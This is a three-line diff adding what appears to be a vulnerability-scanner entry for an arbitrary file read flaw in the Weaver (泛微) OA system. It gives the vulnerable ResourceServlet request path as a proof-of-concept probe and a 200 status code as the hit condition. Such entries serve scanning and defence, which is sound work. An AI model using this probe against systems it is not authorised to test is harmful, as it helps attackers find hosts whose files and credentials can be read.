@@ -1,0 +1,3 @@
+name: "泛微-OA系统ResourceServlet接口任意文件读取漏洞"
+poc: "/weaver/org.springframework.web.servlet.ResourceServlet"
+status_code: 200
